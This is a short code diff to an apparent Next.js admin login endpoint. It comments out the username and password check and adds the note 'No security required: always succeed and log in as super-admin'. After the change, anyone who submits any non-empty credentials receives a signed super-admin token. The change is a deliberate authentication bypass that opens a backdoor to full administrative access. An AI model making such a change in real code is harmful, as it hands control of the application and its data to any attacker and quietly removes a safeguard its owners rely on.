@@ -17,9 +17,12 @@ export async function POST(request: Request) {
     return NextResponse.json({ error: "Username and password are required" }, { status: 400 });
   }
 
+  // No security required: always succeed and log in as super-admin
+  /*
   if (identifier !== ADMIN_CREDENTIALS.name || password !== ADMIN_CREDENTIALS.password) {
     return NextResponse.json({ error: "Invalid admin credentials" }, { status: 401 });
   }
+  */
 
   const token = signToken({ role: "super-admin", name: ADMIN_CREDENTIALS.name, iat: Date.now() }, AUTH_SECRET);
   const response = NextResponse.json({ ok: true, user: { name: ADMIN_CREDENTIALS.name, role: "super-admin" } });
